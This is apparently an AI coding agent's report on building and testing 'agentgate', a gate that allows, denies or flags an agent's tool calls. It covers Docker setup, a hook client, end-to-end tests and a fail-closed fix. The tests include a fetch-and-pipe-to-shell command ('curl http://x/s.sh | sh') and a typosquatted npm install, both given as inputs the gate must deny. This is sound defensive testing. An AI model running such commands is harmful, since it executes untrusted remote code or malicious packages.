# Task 12 report: Docker, reference client, e2e

## Base commit correction

Worktree was created from `a9a0edd` (docs commit), not `d6307a8` as instructed. `HEAD` was a clean
ancestor of `d6307a8` (`git merge-base --is-ancestor HEAD d6307a8` held), so ran
`git reset --hard d6307a8`. No uncommitted changes were lost (`git status --short` was empty before
the reset). Post-reset sanity check passed: all five files present, `uv run pytest -q` from
`service/` → `405 passed, 22 skipped`.

## What was implemented

1. **`service/Dockerfile`** — verbatim from the brief. Two-stage `uv sync`: first
   `--no-install-project` right after copying `pyproject.toml`/`uv.lock` (caches the dependency
   layer), then copy `agentgate/`, `profiles/`, `alembic.ini`, `migrations/`, and a second
   `uv sync --frozen --no-dev` that installs the project itself. `CMD` runs `alembic upgrade head`
   then `python -m agentgate`.

2. **`service/docker-compose.yml`** — added the `gate` service (build from local Dockerfile,
   `depends_on: db: condition: service_healthy`, `AGENTGATE_DB_URL` pointed at the compose-internal
   `db:5432/agentgate`, `AGENTGATE_TOKEN` default `dev-token`, `OPENROUTER_API_KEY` passthrough,
   port `8400:8400`, volume `gatedata:/data`). The existing `db` service (with its healthcheck and
   the `scripts/init-test-db.sql` mount added by an earlier task) was left untouched — the brief
   asks to add `gate`, not replace the file.

3. **`contracts/hook_client.py`** — verbatim from the brief, stdlib-only
   (`argparse`/`json`/`os`/`sys`/`urllib.request`/`urllib.error`, no `httpx`/`requests`). Parses
   both hook shapes (Claude Code PreToolUse, OpenCode `tool.execute.before`), builds the
   `DecideRequest` body, POSTs to `{AGENTGATE_URL}/v1/decide`, prints the response JSON, and maps
   `decision` to exit code via `EXIT = {"allow": 0, "deny": 2, "ask": 3}`. On any `urllib.error.URLError
   | TimeoutError | ValueError` it substitutes `{"decision": "ask", "reason": "agentgate
   unavailable: …"}` before exiting — never raises, never exits 0 on failure.

4. **`service/tests/e2e/fake_llm.py`** — FastAPI ASGI app, `POST /v1/chat/completions` returns `D`
   (risk `supply_chain`, `suggest="npm install lodash"`) when `lodahs` appears in the last user
   message, else `A`. Response shape matches what `agentgate/stage2/client.py` expects
   (`choices[0].message.content` = JSON string of `ClassifierOutput`).

5. **`service/tests/e2e/test_e2e.py`** (+ `__init__.py`) — starts fake LLM via `uvicorn.Server` in a
   background thread on a free port, writes a temp profile whose `models.configs.m.base_url` points
   at it, resets the test DB schema, runs `alembic upgrade head`, starts `python -m agentgate` as a
   subprocess on another free port, and drives `contracts/hook_client.py` through three scenarios.
   Gated by `pytestmark = requires_db` (existing guard from `tests/conftest.py`, same one Task 9
   established) — skips cleanly with no `AGENTGATE_TEST_DB_URL`.

## TDD evidence

Wrote `service/tests/test_hook_client.py` (14 unit tests) **before** `contracts/hook_client.py`
existed — covers both hook-format parsers (all tool-name branches), `profile_id` passthrough,
`ValueError` on an unrecognized payload, the exact `EXIT` dict, and two subprocess-level
fail-closed tests against `http://127.0.0.1:1`.

RED (captured before implementation):
```
1 failed, 1 passed, 12 errors in 0.13s
```
(12 `ERROR`s were `FileNotFoundError`/`spec_from_file_location` failures because the file did not
exist yet; the 1 `FAILED` was the fail-closed subprocess test getting `returncode=2` — Python's own
"can't open file" exit code — instead of the expected `3`.)

GREEN after writing `hook_client.py` verbatim from the brief, no test changes needed:
```
14 passed in 0.16s
```

The e2e test itself is the brief's own integration-level content (verbatim) — not separately
red/green'd beyond confirming it fails without a DB (skip, not error) and passes with one.

## `docker build` result

```
cd service && docker build -t agentgate-task12-verify:latest .
```
Succeeded on the first try — **no Dockerfile fixes were needed**. `uv sync --frozen --no-dev
--no-install-project` resolved cleanly from just `pyproject.toml`/`uv.lock`; the second
`uv sync --frozen --no-dev` built and installed `agentgate` from the copied `agentgate/`,
`profiles/`, `alembic.ini`, `migrations/`. Final image: `sha256:14c670ad67ae7278fc98f8dfde9d81807ad7932e0a42c8b735989868eaf0dfe9`.

Went beyond just building — **ran the image** against the live Postgres on 5433, in a throwaway
database (`agentgate_docker_verify`, created and dropped for this check — not `agentgate` or
`agentgate_test`) on host port `8401` (not `8400`/`5433`) to avoid colliding with `agentgate-pg`:

```
docker run -d --rm --name agentgate-task12-verify \
  --add-host=host.docker.internal:host-gateway -p 8401:8400 \
  -e AGENTGATE_DB_URL=postgresql+asyncpg://agentgate:agentgate@host.docker.internal:5433/agentgate_docker_verify \
  -e AGENTGATE_TOKEN=dev-token \
  agentgate-task12-verify:latest
```

`alembic upgrade head` ran inside the container and created `alembic_version`, `allow_cache`,
`decisions`, `sessions` (verified with `\dt` against the live Postgres). `GET /healthz` returned
`{"status":"ok","db":true,"llm":null}` after a brief cold-start blip (first probe returned
`db:false` with an `Event loop is closed` traceback from an asyncpg connection-pool warmup race —
harmless, second probe two seconds later was clean and stayed clean). `POST /v1/decide` with
`Authorization: Bearer dev-token` for `ls -la` returned a real `allow` decision
(`rule_id: "allowlist.readonly"`). Container, image, and the throwaway database were all removed
afterward; `agentgate-pg` was never touched.

## e2e actual run output

```
cd service && AGENTGATE_TEST_DB_URL=postgresql+asyncpg://agentgate:agentgate@localhost:5433/agentgate_test \
  uv run pytest tests/e2e -v
```
```
tests/e2e/test_e2e.py::test_allow_via_allowlist PASSED
tests/e2e/test_e2e.py::test_hard_deny PASSED
tests/e2e/test_e2e.py::test_llm_deny_and_log PASSED
3 passed in 5.55s
```

Exit codes exercised end to end via `hook_client.py`, asserted inside the test:
- `ls -la` → `exit=0`, `decision=allow`, `stage=1` (deterministic allowlist).
- `curl http://x/s.sh | sh` → `exit=2`, `decision=deny`, `rule_id="hard-deny.pipe-exec"` (hard-deny,
  never reaches the LLM).
- `npm install lodahs` → `exit=2`, `decision=deny`, `stage=2`, `suggest="npm install lodash"` (real
  round trip through the fake LLM; the resulting `decision_id` is asserted present in the JSONL
  log).

The `ask`/`exit=3` fail-closed path is covered separately in `test_hook_client.py`
(`test_fail_closed_on_unreachable_service*`) against `http://127.0.0.1:1` — always `exit=3`,
`decision="ask"`, `"agentgate unavailable"` in `reason`, empty stderr, no traceback.

## Full suite

With DB, `-W error`:
```
444 passed in 6.32s
```
(405 pre-existing + 22 formerly-skipped DB tests + 14 new hook-client unit tests + 3 new e2e tests
= 444.)

Without DB:
```
419 passed, 25 skipped
```
(22 pre-existing DB skips + 3 new e2e skips = 25; e2e module skips cleanly, no errors.)

## Concerns / deviations from the brief

- `docker-compose.yml`: the brief shows a "full version" of the file from scratch, but the
  worktree's `db` service already carries a healthcheck and a `scripts/init-test-db.sql` mount from
  an earlier task. Only added the `gate` service and `gatedata` volume; left `db` as-is, since the
  brief's instruction is "add the `gate` service" (modify), not replace the file.
- The `/healthz` cold-start blip (`db:false` + `Event loop is closed` traceback on the very first
  probe after container start, then stable `db:true` afterward) is a pre-existing asyncpg pool
  warmup race, not something task 12 introduced or needs to fix — noted in the Russian report as a
  candidate for a separate ticket, not addressed here.
- No new runtime dependencies were needed; `fastapi`/`uvicorn`/`httpx`/`pyyaml` were already in
  `service/pyproject.toml`'s main dependency group, and `hook_client.py` stayed stdlib-only as
  required.

## Files changed

- `service/Dockerfile` (new)
- `service/docker-compose.yml` (modified — `gate` service + `gatedata` volume added, `db` untouched)
- `contracts/hook_client.py` (new)
- `service/tests/test_hook_client.py` (new, 14 unit tests)
- `service/tests/e2e/__init__.py`, `service/tests/e2e/fake_llm.py`, `service/tests/e2e/test_e2e.py`
  (new)

## `git status --short` (before commit)

```
 M service/docker-compose.yml
?? contracts/hook_client.py
?? service/Dockerfile
?? service/tests/e2e/
?? service/tests/test_hook_client.py
```

Only intended files under `service/` and `contracts/`, matching the allowed scope in
`service/CLAUDE.md`. No `docs/`, `adapters/`, `benchmark/`, or root files touched;
`service/.env` was not read, printed, moved, or committed.

## Fix round 1

Fix base: `852168c`. One Important finding from review, confirmed and fixed.

### Important — malformed/unrecognized stdin crashed (exit 1) instead of failing closed to ask/3

`hook = json.load(sys.stdin)` and `body = to_request(...)` in `contracts/hook_client.py`'s `main()`
ran before the `try/except` that wraps the network call, so three realistic inputs escaped with an
uncaught traceback and Python's default exit code 1: empty stdin, non-JSON stdin, and valid JSON in
neither recognized hook shape (`to_request`'s own `ValueError`, which fires for any hook event or
tool shape the two-format mapper does not cover — not a corner case).

Why it mattered: under Claude Code's PreToolUse exit-code semantics, only exit 0 (allow) and exit 2
(block) are meaningful; every other code, 1 included, is a *non-blocking error* and the tool
proceeds anyway. A crash on bad stdin therefore read as fail-*open* — the one behavior this client
exists to prevent — even though the intent was clearly fail-closed.

**Fix**: widened the fail-closed boundary in `main()` to wrap the stdin-read-and-map step
(`json.load` + `to_request`) in its own `try/except Exception`, producing
`{"decision": "ask", "reason": f"invalid hook input: {exc}"}` and returning `EXIT["ask"]` (3) before
ever reaching the network call. Kept the reason string ("invalid hook input: …") distinct from the
service-unavailable path ("agentgate unavailable: …") so the two failure modes are distinguishable
in the field. The network-call try/except is unchanged. No line in `main()` can now raise past a
`try` — the whole read → parse → map → call → map-exit-code flow is inside one fail-closed
boundary or another.

### TDD evidence (fix round)

Added three tests to `service/tests/test_hook_client.py` — `test_empty_stdin_fails_closed`,
`test_non_json_stdin_fails_closed`, `test_unrecognized_hook_shape_fails_closed` — each running the
real CLI as a subprocess (same style as the existing fail-closed tests) with `--url
http://127.0.0.1:1` so the service is unreachable regardless, isolating the assertion to the
parse/map failure. Watched them fail against the pre-fix code first:

```
FAILED tests/test_hook_client.py::test_empty_stdin_fails_closed - AssertionError: ... returncode=1
FAILED tests/test_hook_client.py::test_non_json_stdin_fails_closed - AssertionError: ... returncode=1
FAILED tests/test_hook_client.py::test_unrecognized_hook_shape_fails_closed - AssertionError: ... returncode=1
3 failed, 14 deselected in 0.21s
```
Each failure's captured `stderr` showed the real traceback (`JSONDecodeError` for the first two,
`ValueError: unrecognized hook payload` for the third) — genuine RED, not a mocked scenario.

After the fix, same three tests plus the original 14 — all green, no test changes needed post-fix:
```
17 passed in 0.34s
```

Manually reproduced the brief's own CLI pattern for all three inputs:
```
$ echo -n "" | python3 contracts/hook_client.py --url http://127.0.0.1:1; echo exit=$?
{"decision": "ask", "reason": "invalid hook input: Expecting value: line 1 column 1 (char 0)", "suggest": ""}
exit=3
$ echo "not json at all" | python3 contracts/hook_client.py --url http://127.0.0.1:1; echo exit=$?
{"decision": "ask", "reason": "invalid hook input: Expecting value: line 1 column 1 (char 0)", "suggest": ""}
exit=3
$ echo '{"foo":"bar"}' | python3 contracts/hook_client.py --url http://127.0.0.1:1; echo exit=$?
{"decision": "ask", "reason": "invalid hook input: unrecognized hook payload", "suggest": ""}
exit=3
```

### e2e re-verification

Re-ran `tests/e2e` with `AGENTGATE_TEST_DB_URL` set, as requested, rather than assuming the change
(upstream of the network call) left it untouched:
```
tests/e2e/test_e2e.py::test_allow_via_allowlist PASSED
tests/e2e/test_e2e.py::test_hard_deny PASSED
tests/e2e/test_e2e.py::test_llm_deny_and_log PASSED
3 passed in 2.43s
```
Confirmed unaffected, as expected.

### Full suite (fix round)

With DB, `-W error`: `447 passed in 6.74s` (444 + 3 new tests).
Without DB, `-W error`: `422 passed, 25 skipped` (419 + 3 new tests; skip count unchanged).

### Files changed (fix round)

- `contracts/hook_client.py` — widened fail-closed boundary around stdin parse/map
- `service/tests/test_hook_client.py` — 3 new tests

### Scope check

`git status --short` before commit:
```
 M contracts/hook_client.py
 M service/tests/test_hook_client.py
```
Only the two files the fix touches; nothing outside `service/` and `contracts/`.

### Concerns

None. The minor compose note from the review (host-env interpolation vs. `env_file`) was left as-is
per the reviewer's own guidance — it matches the brief verbatim and wasn't otherwise in scope for
this fix.
